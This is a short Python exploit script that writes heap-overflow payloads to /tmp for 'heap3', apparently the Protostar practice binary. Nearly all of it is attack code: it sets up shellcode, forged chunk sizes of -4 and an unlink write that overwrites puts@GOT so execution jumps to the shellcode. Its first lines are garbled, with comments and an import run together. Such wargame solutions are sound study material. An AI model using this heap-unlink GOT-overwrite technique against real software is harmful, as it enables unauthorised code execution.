#!/usr/bin/python# usage:
# run this script, then start heap3 as:
# ./heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
# the script will write /tmp/[A,B,C] payloadsimport struct# first argument

import struct

buf1 = ''
buf1 += 'AAAA' # unused

# second argument
buf2 = ''
buf2 += '\xff'*16
buf2 += "\x68\xcb\x84\x04\x08\xc3" # shellcode
buf2 += '\xff'*(32-len(buf2))
# overwrite prev_size and size of the last chunk with -4
buf2 += struct.pack('I', 0xfffffffc)*2

# third argument
buf3 = ''
buf3 += '\xff'*4 # junk
buf3 += struct.pack('I', 0x804a01c-12) # puts@GOT-12
buf3 += struct.pack('I', 0x804b040) # address of the shellcode

files = ["/tmp/A", "/tmp/B", "/tmp/C"]
buffers = [buf1, buf2, buf3]

for f_name, buf in zip(files, buffers):
        with open(f_name, 'wb') as f:
                f.write(buf)
